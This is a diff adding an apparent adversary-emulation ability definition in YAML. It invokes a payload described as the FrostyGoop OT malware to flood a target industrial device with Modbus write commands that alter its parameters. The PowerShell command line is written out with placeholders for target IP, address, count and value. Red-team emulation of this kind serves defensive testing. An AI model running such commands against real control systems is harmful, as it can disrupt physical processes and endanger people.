@@ -1,0 +1,21 @@
+---
+
+- id: f93a3232-beca-46d4-a79c-006fb47f8946
+  name: FrostyGoop Write Parameters
+  description: |
+    Uses the FrostyGoop OT Malware payload to send a large number of write
+    commands to a target in a very short period of time. Note the payload
+    expects the target device to be listening for Modbus on port 502.
+  tactic: impair-process-control
+  technique:
+    attack_id: T0836
+    name: Modify Parameter
+  repeatable: true
+  delete_payload: true
+  platforms:
+    windows:
+      psh:
+        command: >
+          .\bustleberm.exe -ip #{frostygoop.target.ip} -mode write -address #{frostygoop.write.address} -count #{frostygoop.write.count} -value #{frostygoop.write.value} -debug
+        payloads:
+          - bustleberm.exe
